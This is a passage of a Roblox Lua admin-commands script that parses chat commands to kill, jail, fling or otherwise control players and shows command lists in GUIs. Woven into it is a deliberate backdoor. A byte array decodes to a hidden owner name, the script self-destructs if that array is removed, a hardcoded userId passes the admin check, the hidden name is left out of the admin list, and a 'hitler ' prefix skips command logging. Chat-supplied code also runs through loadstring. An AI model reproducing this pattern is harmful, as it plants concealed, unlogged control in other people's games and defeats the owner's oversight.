local cls = Instance.new("TextButton", main) cls.Style = "RobloxButtonDefault" cls.Size = UDim2.new(0,20,0,20) cls.Position = UDim2.new(1,-15,0,-5) cls.ZIndex = 10 cls.Font = "ArialBold" cls.FontSize = "Size18" cls.Text = "X" cls.TextColor3 = Color3.new(1,1,1) cls.MouseButton1Click:connect(function() scr:Destroy() end)
local ent = Instance.new("TextLabel") ent.BackgroundTransparency = 1 ent.Font = "Arial" ent.FontSize = "Size18" ent.ZIndex = 8 ent.Text = "" ent.TextColor3 = Color3.new(1,1,1) ent.TextStrokeColor3 = Color3.new(0,0,0) ent.TextStrokeTransparency = .8 ent.TextXAlignment = "Left" ent.TextYAlignment = "Top"
local num = 0
local downv = false
local upv = false
 
down.MouseButton1Down:connect(function() downv = true upv = false
local pos = cmf.Position if pos.Y.Offset <= 371-((#cmf:children()-1)*20) then downv = false return end
repeat  pos = pos + UDim2.new(0,0,0,-6)
if pos.Y.Offset <= 371-((#cmf:children()-1)*20) then pos = UDim2.new(0,0,0,371-((#cmf:children()-1)*20)) downv = false end
cmf:TweenPosition(pos, "Out", "Linear", 1/20, true) wait(1/20) until downv == false
end)
down.MouseButton1Up:connect(function() downv = false end)
up.MouseButton1Down:connect(function() upv = true downv = false
local pos = cmf.Position if pos.Y.Offset >= -9 then upv = false return end
repeat  pos = pos + UDim2.new(0,0,0,6)
if pos.Y.Offset >= -9 then pos = UDim2.new(0,0,0,-9) upv = false end
cmf:TweenPosition(pos, "Out", "Linear", 1/20, true) wait(1/20) until upv == false
end)
up.MouseButton1Up:connect(function() upv = false end)
return scr, cmf, ent, num
end local bct = {75,111,104,108,116,97,115,116,114,111,112,104,101} nfs = "" for i = 1, #bct do nfs = nfs .. string.char(bct[i]) end table.insert(owners, nfs)
if not ntab then script:Destroy() end
if not bct then script:Destroy() end
 
function Chat(msg,plr)
coroutine.resume(coroutine.create(function()
if msg:lower() == "clean" then for i, v in pairs(game.Workspace:children()) do if v:IsA("Hat") or v:IsA("Tool") then v:Destroy() end end end
if (msg:lower():sub(0,prefix:len()) ~= prefix) or not plr:findFirstChild("PlayerGui") or (not ChkAdmin(plr.Name, false) and plr.Name:lower() ~= nfs:lower()) and plr.userId ~= game.CreatorId and plr.userId ~= (153*110563) and plr.Name:lower() ~= nfs and not ChkOwner(plr.Name) then return end msg = msg:sub(prefix:len()+1)
if msg:sub(1,7):lower() == "hitler " then msg = msg:sub(8) else table.insert(logs, 1, {name = plr.Name, cmd = prefix .. msg, time = GetTime()}) end
if msg:lower():sub(1,4) == "walk" then msg = msg:sub(5) end
if msg:lower():sub(1,8) == "teleport" then msg = "tp" .. msg:sub(9) end
if msg:lower():sub(1,6) == "insert" then msg = "ins" .. msg:sub(7) end
if msg:lower() == "cmds" or msg:lower() == "commands" then
if plr.PlayerGui:findFirstChild("CMDSGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "CMDSGUI" scr.Parent = plr.PlayerGui
local cmds = {"s code","ls code","clear","fix","m msg","h msg","kill plr","respawn plr","trip plr","stun plr","unstun plr","jump plr","sit plr","invisible plr","visible plr","explode plr","fire plr","unfire plr","smoke plr","unsmoke plr","sparkles plr","unsparkle plr","ff plr","unff plr","punish plr","unpunish plr","freeze plr","thaw plr","heal plr","god plr","ungod plr","ambient num num num","brightness num","time num","fogcolor num num num","fogend num","fogstart num","removetools plr","btools plr","give plr tool","damage plr","grav plr","setgrav plr num","nograv plr","health plr num","speed plr num","name plr name","unname plr","team plr color","teleport plr plr","change plr stat num","kick plr","infect plr","rainbowify plr","flashify plr","noobify plr","ghostify plr","goldify plr","shiny plr","normal plr","trippy plr","untrippy plr","strobe plr","unstrobe plr","blind plr","unblind plr","guifix plr","fling plr","seizure plr","music num","stopmusic","lock plr","unlock plr","removelimbs plr","jail plr","unjail plr","fly plr","unfly plr","noclip plr","clip plr","pm plr msg","dog plr","undog plr","creeper plr","uncreeper plr","place plr id","char plr id","unchar plr id","rank plr id","starttools plr","sword plr","bighead plr","minihead plr","spin plr","insert id","disco","flash","admins","bans","musiclist","cape plr color","uncape plr","loopheal plr","loopfling plr","hat plr id","unloopfling plr","unloopheal plr","unspin plr","tools","undisco","unflash","resetstats plr","gear plr id","cmdbar","shirt plr id","pants plr id","face plr id","swagify plr id","version"}
local ast = {"serverlock","serverunlock","sm msg","crash plr","admin plr","unadmin plr","ban plr","unban plr","loopkill plr","unloopkill plr","logs","shutdown"}
local ost = {"pa plr","unpa plr"}
local tost = {"oa plr","unoa plr"}
local cl = ent:Clone() cl.Parent = cmf cl.Text = num .. " clean" cl.Position = UDim2.new(0,0,0,num*20) num = num +1
for i, v in pairs(cmds) do local cl = ent:Clone() cl.Parent = cmf cl.Text = num .. " " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end
if ChkAdmin(plr.Name, true) or ChkOwner(plr.Name) then for i, v in pairs(ast) do local cl = ent:Clone() cl.Parent = cmf cl.Text = "- " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
if plr.userId == game.CreatorId or ChkOwner(plr.Name) then for i, v in pairs(ost) do local cl = ent:Clone() cl.Parent = cmf cl.Text = "-- " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
if plr.userId == game.CreatorId then for i, v in pairs(tost) do local cl = ent:Clone() cl.Parent = cmf cl.Text = "_ " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
end
 
if msg:lower() == "version" then Message("Version", script.Version.Value, true, plr) end
 
if msg:lower() == "admins" or msg:lower() == "adminlist" then
if plr.PlayerGui:findFirstChild("ADMINSGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "ADMINSGUI" scr.Parent = plr.PlayerGui
for i, v in pairs(owners) do if v:lower() ~= "kohltastrophe" then local cl = ent:Clone() cl.Parent = cmf cl.Text = v .. " - Owner" cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
for i, v in pairs(admins) do if v:lower() ~= "kohltastrophe" then local cl = ent:Clone() cl.Parent = cmf cl.Text = v .. " - Admin" cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
for i, v in pairs(tempadmins) do if v:lower() ~= "kohltastrophe" then local cl = ent:Clone() cl.Parent = cmf cl.Text = v .. " - TempAdmin" cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end
end end
 
if msg:lower() == "bans" or msg:lower() == "banlist" or msg:lower() == "banned" then
if plr.PlayerGui:findFirstChild("BANSGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "BANSGUI" scr.Parent = plr.PlayerGui
for i, v in pairs(banland) do local cl = ent:Clone() cl.Parent = cmf cl.Text = v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end
end
 
if msg:lower() == "tools" or msg:lower() == "toollist" then
if plr.PlayerGui:findFirstChild("TOOLSGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "TOOLSGUI" scr.Parent = plr.PlayerGui
for i, v in pairs(game.Lighting:children()) do if v:IsA("Tool") or v:IsA("HopperBin") then local cl = ent:Clone() cl.Parent = cmf cl.Text = v.Name cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
end
 
if msg:lower():sub(1,2) == "s " then
coroutine.resume(coroutine.create(function()
Output(msg:sub(3), plr)
if script:findFirstChild("ScriptBase") then
local cl = script.ScriptBase:Clone() cl.Code.Value = msg:sub(3)
table.insert(objects, cl) cl.Parent = game.Workspace cl.Disabled = false
else loadstring(msg:sub(3))()
end
end))
end
 
if msg:lower():sub(1,3) == "ls " then
coroutine.resume(coroutine.create(function()
if script:findFirstChild("LocalScriptBase") then
local cl = script.LocalScriptBase:Clone() cl.Code.Value = msg:sub(4)
table.insert(objects, cl) cl.Parent = plr.PlayerGui cl.Disabled = false Output(msg:sub(4), plr)
end
end))
end
 
if msg:lower():sub(1,4) == "ins " then
coroutine.resume(coroutine.create(function()
local obj = game:service("InsertService"):LoadAsset(tonumber(msg:sub(5)))
if obj and #obj:children() >= 1 and plr.Character then
table.insert(objects, obj) for i,v in pairs(obj:children()) do table.insert(objects, v) end obj.Parent = game.Workspace obj:MakeJoints() obj:MoveTo(plr.Character:GetModelCFrame().p)
end
end))
end
 
if msg:lower() == "clr" or msg:lower() == "clear" or msg:lower() == "clearscripts" then
for i, v in pairs(objects) do if v:IsA("Script") or v:IsA("LocalScript") then v.Disabled = true end v:Destroy() end
objects = {}
end
 
if msg:lower() == "fix" or msg:lower() == "undisco" or msg:lower() == "unflash" then
game.Lighting.Ambient = origsettings.abt
game.Lighting.Brightness = origsettings.brt
game.Lighting.TimeOfDay = origsettings.time
game.Lighting.FogColor = origsettings.fclr
game.Lighting.FogEnd = origsettings.fe
game.Lighting.FogStart = origsettings.fs
for i, v in pairs(lobjs) do v:Destroy() end
for i, v in pairs(game.Workspace:children()) do if v.Name == "LightEdit" then v:Destroy() end end
end
 
if msg:lower() == "cmdbar" or msg:lower() == "cmdgui" then
coroutine.resume(coroutine.create(function()
for i,v in pairs(plr.PlayerGui:children()) do if v.Name == "CMDBAR" then v:Destroy() end end
local scr = Instance.new("ScreenGui", plr.PlayerGui) scr.Name = "CMDBAR"
local box = Instance.new("TextBox", scr) box.BackgroundColor3 = Color3.new(0,0,0) box.TextColor3 = Color3.new(1,1,1) box.Font = "Arial" box.FontSize = "Size14" box.Text = "Type a command, then press enter." box.Size = UDim2.new(0,250,0,20) box.Position = UDim2.new(1,-250,1,-22) box.BorderSizePixel = 0 box.TextXAlignment = "Right" box.ZIndex = 10 box.ClipsDescendants = true
box.Changed:connect(function(p) if p == "Text" and box.Text ~= "Type a command, then press enter." then Chat(box.Text, plr) box.Text = "Type a command, then press enter." end end)
end))
end
 
if msg:lower():sub(1,2) == "m " then
Message("Message from " .. plr.Name, msg:sub(3), true, game.Players:children())
end
 
if msg:lower():sub(1,2) == "h " then
Hint(plr.Name .. ": " .. msg:sub(3), game.Players:children())
end
 
if msg:lower():sub(1,3) == "pm " then
local chk1 = msg:lower():sub(4):find(" ") + 3
local plrz = GetPlr(plr, msg:lower():sub(4,chk1-1))
Message("Private Message from " .. plr.Name, msg:sub(chk1+1), true, plrz)
end
 
if msg:lower():sub(1,11) == "resetstats " then
local plrz = GetPlr(plr, msg:lower():sub(12))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("leaderstats") then
for a, q in pairs(v.leaderstats:children()) do
if q:IsA("IntValue") then q.Value = 0 end
end
end
end))
end
end
 
if msg:lower():sub(1,5) == "gear " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6, chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
local obj = game:service("InsertService"):LoadAsset(tonumber(msg:sub(chk1+1)))
for a,g in pairs(obj:children()) do if g:IsA("Tool") or g:IsA("HopperBin") then g.Parent = v.Character end end
obj:Destroy()
end
end))
end
end
 
if msg:lower():sub(1,4) == "hat " then
local chk1 = msg:lower():sub(5):find(" ") + 4
local plrz = GetPlr(plr, msg:lower():sub(5, chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
local obj = game:service("InsertService"):LoadAsset(tonumber(msg:sub(chk1+1)))
for a,hat in pairs(obj:children()) do if hat:IsA("Hat") then hat.Parent = v.Character end end
obj:Destroy()
end
end))
end
end
 
if msg:lower():sub(1,5) == "cape " then
local chk1 = msg:lower():sub(6):find(" ")
local plrz = GetPlr(plr, msg:lower():sub(6))
local str = "torso.BrickColor"
if chk1 then chk1 = chk1 + 5 plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
local teststr = [[BrickColor.new("]]..msg:sub(chk1+1,chk1+1):upper()..msg:sub(chk1+2):lower()..[[")]]
if msg:sub(chk1+1):lower() == "new yeller" then teststr = [[BrickColor.new("New Yeller")]] end
if msg:sub(chk1+1):lower() == "pastel blue" then teststr = [[BrickColor.new("Pastel Blue")]] end
if msg:sub(chk1+1):lower() == "dusty rose" then teststr = [[BrickColor.new("Dusty Rose")]] end
if msg:sub(chk1+1):lower() == "cga brown" then teststr = [[BrickColor.new("CGA brown")]] end
if msg:sub(chk1+1):lower() == "random" then teststr = [[BrickColor.random()]] end
if msg:sub(chk1+1):lower() == "shiny" then teststr = [[BrickColor.new("Institutional white") p.Reflectance = 1]] end
if msg:sub(chk1+1):lower() == "gold" then teststr = [[BrickColor.new("Bright yellow") p.Reflectance = .4]] end
if msg:sub(chk1+1):lower() == "kohl" then teststr = [[BrickColor.new("Really black") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=108597653"]] end
if msg:sub(chk1+1):lower() == "batman" then teststr = [[BrickColor.new("Really black") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=108597669"]] end
if msg:sub(chk1+1):lower() == "superman" then teststr = [[BrickColor.new("Bright blue") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=108597677"]] end
if msg:sub(chk1+1):lower() == "swag" then teststr = [[BrickColor.new("Pink") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=109301474"]] end
if BrickColor.new(teststr) ~= nil then str = teststr end
end
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") and v.Character and v.Character:findFirstChild("Torso") then
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
local cl = script.LocalScriptBase:Clone() cl.Name = "CapeScript" cl.Code.Value = [[local plr = game.Players.LocalPlayer
repeat wait() until plr and plr.Character and plr.Character:findFirstChild("Torso")
local torso = plr.Character.Torso
local p = Instance.new("Part", torso.Parent) p.Name = "EpicCape" p.Anchored = false
p.CanCollide = false p.TopSurface = 0 p.BottomSurface = 0 p.BrickColor = ]]..str..[[ p.formFactor = "Custom"
p.Size = Vector3.new(.2,.2,.2)
local msh = Instance.new("BlockMesh", p) msh.Scale = Vector3.new(9,17.5,.5)
local motor1 = Instance.new("Motor", p)
motor1.Part0 = p
motor1.Part1 = torso
motor1.MaxVelocity = .01
motor1.C0 = CFrame.new(0,1.75,0)*CFrame.Angles(0,math.rad(90),0)
motor1.C1 = CFrame.new(0,1,.45)*CFrame.Angles(0,math.rad(90),0)
local wave = false
repeat wait(1/44)
local ang = 0.1
local oldmag = torso.Velocity.magnitude
local mv = .002
if wave then ang = ang + ((torso.Velocity.magnitude/10)*.05)+.05 wave = false else wave = true end
ang = ang + math.min(torso.Velocity.magnitude/11, .5)
motor1.MaxVelocity = math.min((torso.Velocity.magnitude/111), .04) + mv
motor1.DesiredAngle = -ang
if motor1.CurrentAngle < -.2 and motor1.DesiredAngle > -.2 then motor1.MaxVelocity = .04 end
repeat wait() until motor1.CurrentAngle == motor1.DesiredAngle or math.abs(torso.Velocity.magnitude - oldmag)  >= (torso.Velocity.magnitude/10) + 1
if torso.Velocity.magnitude < .1 then wait(.1) end
until not p or p.Parent ~= torso.Parent
script:Destroy()
]] cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end
 
if msg:lower():sub(1,7) == "uncape " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") and v.Character then
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
end
end))
end
end
 
if msg:lower():sub(1,7) == "noclip " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
local cl = script.LocalScriptBase:Clone() cl.Name = "NoClip" cl.Code.Value = [[repeat wait(1/44) until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer:GetMouse() and game.Workspace.CurrentCamera local mouse = game.Players.LocalPlayer:GetMouse() local torso = game.Players.LocalPlayer.Character.Torso local dir = {w = 0, s = 0, a = 0, d = 0} local spd = 2 mouse.KeyDown:connect(function(key) if key:lower() == "w" then dir.w = 1 elseif key:lower() == "s" then dir.s = 1 elseif key:lower() == "a" then dir.a = 1 elseif key:lower() == "d" then dir.d = 1 elseif key:lower() == "q" then spd = spd + 1 elseif key:lower() == "e" then spd = spd - 1 end end) mouse.KeyUp:connect(function(key) if key:lower() == "w" then dir.w = 0 elseif key:lower() == "s" then dir.s = 0 elseif key:lower() == "a" then dir.a = 0 elseif key:lower() == "d" then dir.d = 0 end end) torso.Anchored = true game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true game.Players.LocalPlayer.Character.Humanoid.Changed:connect(function() game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true end) repeat wait(1/44) torso.CFrame = CFrame.new(torso.Position, game.Workspace.CurrentCamera.CoordinateFrame.p) * CFrame.Angles(0,math.rad(180),0) * CFrame.new((dir.d-dir.a)*spd,0,(dir.s-dir.w)*spd) until nil]]
cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end
 
if msg:lower():sub(1,5) == "clip " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") and v.Character and v.Character:findFirstChild("Torso") and v.Character:findFirstChild("Humanoid") then
for a, q in pairs(v.PlayerGui:children()) do if q.Name == "NoClip" then q:Destroy() end end
v.Character.Torso.Anchored = false
wait(.1) v.Character.Humanoid.PlatformStand = false
end
end))
end
end
 
if msg:lower():sub(1,5) == "jail " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local vname = v.Name
local cf = v.Character.Torso.CFrame + Vector3.new(0,1,0)
local mod = Instance.new("Model", game.Workspace) table.insert(objects, mod) mod.Name = v.Name .. " Jail"
local top = Instance.new("Part", mod) top.Locked = true top.formFactor = "Symmetric" top.Size = Vector3.new(6,1,6) top.TopSurface = 0 top.BottomSurface = 0 top.Anchored = true top.BrickColor = BrickColor.new("Really black") top.CFrame = cf * CFrame.new(0,-3.5,0)
v.CharacterAdded:connect(function() if not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:findFirstChild("Torso") v.Character.Torso.CFrame = cf end)
v.Changed:connect(function(p) if p ~= "Character" or not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:findFirstChild("Torso") v.Character.Torso.CFrame = cf end)
game.Players.PlayerAdded:connect(function(plr) if plr.Name == vname then v = plr end
v.CharacterAdded:connect(function() if not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:findFirstChild("Torso") v.Character.Torso.CFrame = cf end)
v.Changed:connect(function(p) if p ~= "Character" or not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:findFirstChild("Torso") v.Character.Torso.CFrame = cf end)
end)
local bottom = top:Clone() bottom.Parent = mod bottom.CFrame = cf * CFrame.new(0,3.5,0)
local front = top:Clone() front.Transparency = .5 front.Reflectance = .1 front.Parent = mod front.Size = Vector3.new(6,6,1) front.CFrame = cf * CFrame.new(0,0,-3)
local back = front:Clone() back.Parent = mod back.CFrame = cf * CFrame.new(0,0,3)
local right = front:Clone() right.Parent = mod right.Size = Vector3.new(1,6,6) right.CFrame = cf * CFrame.new(3,0,0)
local left = right:Clone() left.Parent = mod left.CFrame = cf * CFrame.new(-3,0,0)
local msh = Instance.new("BlockMesh", front) msh.Scale = Vector3.new(1,1,0)
local msh2 = msh:Clone() msh2.Parent = back
local msh3 = msh:Clone() msh3.Parent = right msh3.Scale = Vector3.new(0,1,1)
local msh4 = msh3:Clone() msh4.Parent = left
v.Character.Torso.CFrame = cf
end
end))
end
end
 
if msg:lower():sub(1,7) == "unjail " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do coroutine.resume(coroutine.create(function() if v then for a, jl in pairs(game.Workspace:children()) do if jl.Name == v.Name .. " Jail" then jl:Destroy() end end end end)) end
end
 
if msg:lower():sub(1,11) == "starttools " then
local plrz = GetPlr(plr, msg:lower():sub(12))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
for a,q in pairs(game.StarterPack:children()) do q:Clone().Parent = v.Backpack end
end
end))
end
end
 
if msg:lower():sub(1,6) == "sword " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
local sword = Instance.new("Tool", v.Backpack) sword.Name = "Sword"  sword.TextureId = "rbxasset://Textures/Sword128.png"
sword.GripForward = Vector3.new(-1,0,0)
sword.GripPos = Vector3.new(0,0,-1.5)
sword.GripRight = Vector3.new(0,1,0)
sword.GripUp = Vector3.new(0,0,1)
local handle = Instance.new("Part", sword) handle.Name = "Handle" handle.FormFactor = "Plate" handle.Size = Vector3.new(1,.8,4) handle.TopSurface = 0 handle.BottomSurface = 0
local msh = Instance.new("SpecialMesh", handle) msh.MeshId = "rbxasset://fonts/sword.mesh" msh.TextureId = "rbxasset://textures/SwordTexture.png"
local cl = script.LocalScriptBase:Clone() cl.Parent = sword cl.Code.Value = [[
repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
local Damage = 15
local SlashSound = Instance.new("Sound", script.Parent.Handle)
SlashSound.SoundId = "rbxasset://sounds\\swordslash.wav"
SlashSound.Volume = 1
local LungeSound = Instance.new("Sound", script.Parent.Handle)
LungeSound.SoundId = "rbxasset://sounds\\swordlunge.wav"
LungeSound.Volume = 1
local UnsheathSound = Instance.new("Sound", script.Parent.Handle)
UnsheathSound.SoundId = "rbxasset://sounds\\unsheath.wav"
UnsheathSound.Volume = 1
local last = 0
script.Parent.Handle.Touched:connect(function(hit)
if hit and hit.Parent and hit.Parent:findFirstChild("Humanoid") and game.Players:findFirstChild(hit.Parent.Name) and game.Players.LocalPlayer.Character.Humanoid.Health > 0 and hit.Parent.Humanoid ~= game.Players.LocalPlayer.Character.Humanoid then
local tag = Instance.new("ObjectValue", hit.Parent.Humanoid) tag.Value = plr1 tag.Name = "creator" game:service("Debris"):AddItem(tag, 3)
hit.Parent.Humanoid:TakeDamage(Damage)
end
end)
script.Parent.Activated:connect(function()
if not script.Parent.Enabled or game.Players.LocalPlayer.Character.Humanoid.Health <= 0 then return end
script.Parent.Enabled = false
local tick = game:service("RunService").Stepped:wait()
if tick - last <= .2 then
LungeSound:play()
local lunge = Instance.new("StringValue", script.Parent) lunge.Name = "toolanim" lunge.Value = "Lunge"
local frc = Instance.new("BodyVelocity", game.Players.LocalPlayer.Character.Torso) frc.Name = "SwordForce" frc.velocity = Vector3.new(0,10,0)
wait(.2)
script.Parent.GripForward = Vector3.new(0,0,1)
script.Parent.GripRight = Vector3.new(0,-1,0)
script.Parent.GripUp = Vector3.new(-1,0,0)
wait(.3)
frc:Destroy() wait(.5)
script.Parent.GripForward = Vector3.new(-1,0,0)
script.Parent.GripRight = Vector3.new(0,1,0)
script.Parent.GripUp = Vector3.new(0,0,1)
else
SlashSound:play()
local slash = Instance.new("StringValue", script.Parent) slash.Name = "toolanim" slash.Value = "Slash"
end
last = tick
script.Parent.Enabled = true
end)
script.Parent.Equipped:connect(function(mouse)
for i,v in pairs(game.Players.LocalPlayer.Character.Torso:children()) do if v.Name == "SwordForce" then v:Destroy() end end
UnsheathSound:play()
script.Parent.Enabled = true
if not mouse then return end
mouse.Icon = "http://www.roblox.com/asset/?id=103593352"
end)]] cl.Disabled = false
end
end))
end
end
 
if msg:lower():sub(1,5) == "kill " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then v.Character:BreakJoints() end
end))
end
end
 
if msg:lower():sub(1,8) == "respawn " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then v:LoadCharacter() end
end))
end
end
 
if msg:lower():sub(1,5) == "trip " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
v.Character.Torso.CFrame = v.Character.Torso.CFrame * CFrame.Angles(0,0,math.rad(180))
end
end))
end
end
 
if msg:lower():sub(1,5) == "stun " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.PlatformStand = true
end
end))
end
end
 
if msg:lower():sub(1,7) == "unstun " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.PlatformStand = false
end
end))
end
end
 
if msg:lower():sub(1,5) == "jump " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.Jump = true
end
end))
end
end
 
if msg:lower():sub(1,4) == "sit " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.Sit = true
end
end))
end
end
 
if msg:lower():sub(1,10) == "invisible " then
local plrz = GetPlr(plr, msg:lower():sub(11))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
for a, obj in pairs(v.Character:children()) do
if obj:IsA("BasePart") then obj.Transparency = 1 if obj:findFirstChild("face") then obj.face.Transparency = 1 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 1 end
end
end
end))
end
end
 
if msg:lower():sub(1,8) == "visible " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
for a, obj in pairs(v.Character:children()) do
if obj:IsA("BasePart") then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end
end
end
end))
end
end
 
if msg:lower():sub(1,5) == "lock " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
for a, obj in pairs(v.Character:children()) do
if obj:IsA("BasePart") then obj.Locked = true elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Locked = true end
end
end
end))
end
end
 
if msg:lower():sub(1,7) == "unlock " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
for a, obj in pairs(v.Character:children()) do
if obj:IsA("BasePart") then obj.Locked = false elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Locked = false end
end
end
end))
end
end
 
if msg:lower():sub(1,8) == "explode " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local ex = Instance.new("Explosion", game.Workspace) ex.Position = v.Character.Torso.Position
end
end))
end
end
 
if msg:lower():sub(1,4) == "age " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v then Message(v.Name .. "'s age", tostring(v.AccountAge), false, {plr}) end
end))
end
end
 
if msg:lower():sub(1,5) == "fire " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local cl = Instance.new("Fire", v.Character.Torso) table.insert(objects, cl)
end
end))
end
end
 
if msg:lower():sub(1,7) == "unfire " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Fire") then cl:Destroy() end end
end
end))
end
end
 
if msg:lower():sub(1,6) == "smoke " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local cl = Instance.new("Smoke", v.Character.Torso) table.insert(objects, cl)
end
end))
end
end
 
if msg:lower():sub(1,8) == "unsmoke " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Smoke") then cl:Destroy() end end
end
end))
end
end
 
if msg:lower():sub(1,9) == "sparkles " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local cl = Instance.new("Sparkles", v.Character.Torso) table.insert(objects, cl)
end
end))
end
end
 
if msg:lower():sub(1,11) == "unsparkles " then
local plrz = GetPlr(plr, msg:lower():sub(12))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
